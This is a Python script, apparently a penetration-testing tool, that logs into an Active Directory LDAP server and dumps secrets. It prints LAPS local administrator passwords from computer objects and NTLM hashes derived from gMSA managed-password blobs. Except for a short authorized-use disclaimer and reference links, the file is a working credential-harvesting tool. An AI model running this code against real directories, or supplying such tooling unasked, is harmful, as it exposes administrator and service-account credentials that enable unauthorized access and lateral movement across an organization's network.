# Author: 0xalwayslucky (https://github.com/0xalwayslucky)
#
# This script should be used for authorized penetration testing purposes only.
# Any misuse will not be the responsibility of the author and thus the author can't
# be held liable for any damages arising from this software
#
# References:
# https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries/readgmsapassword
# https://github.com/SecureAuthCorp/impacket/blob/3f3002e1c1dd78a5ee6100d6824ff7b65bbb92b6/impacket/examples/ntlmrelayx/attacks/ldapattack.py#L672-L702
# https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/
import argparse, json, binascii
from Cryptodome.Hash import MD4
from ldap3 import Server, Connection, NTLM, ALL, SUBTREE
from impacket.examples.ntlmrelayx.attacks.ldapattack import MSDS_MANAGEDPASSWORD_BLOB


def connect(use_ssl=False):
    global arguments
    s = Server(arguments.host, get_info=ALL, use_ssl=use_ssl)
    c = Connection(s, user=arguments.user, password=arguments.password, authentication=NTLM, auto_bind=True)
    return s, c


def get_search_base(s):
    info = json.loads(s.info.to_json())['raw']
    return str(info["defaultNamingContext"]).strip("[']")


def dump_lapspwd():
    s, c = connect()
    c.search(search_base=get_search_base(s), search_scope=SUBTREE, search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))', attributes=['sAMAccountname', 'ms-MCS-AdmPwd'])
    for entry in c.entries:
        print(str(entry['sAMAccountName']) + ':' + str(entry['ms-MCS-AdmPwd']))


def dump_msdspwd():
    s, c = connect(True)
    c.search(get_search_base(s), '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=SUBTREE, attributes=['sAMAccountName', 'msDS-ManagedPassword'])

    for entry in c.entries:
        pwd_blob = MSDS_MANAGEDPASSWORD_BLOB()
        pwd_blob.fromString(str(entry['msDS-ManagedPassword']).encode('utf-8'))
        pwd_hash = MD4.new()
        pwd_hash.update(pwd_blob['CurrentPassword'][:-2])
        pwd = binascii.hexlify(pwd_hash.digest()).decode('utf-8')
        print(str(entry['sAMAccountName']) + ':::' + pwd)


parser = argparse.ArgumentParser()
parser.add_argument('-H', '--host', help='host of ldap server', required=True)
parser.add_argument('-u', '--user', help='username (domain\\user)', required=True)
parser.add_argument('-p', '--password', help='password for user', required=True)
parser.add_argument('--dumplaps', help='dump laps password', action='store_true', required=False)
parser.add_argument('--dumpmsds', help='dump msDS-Password', action='store_true', required=False)

arguments = parser.parse_args()
if arguments.dumplaps:
    dump_lapspwd()
elif arguments.dumpmsds:
    dump_msdspwd()

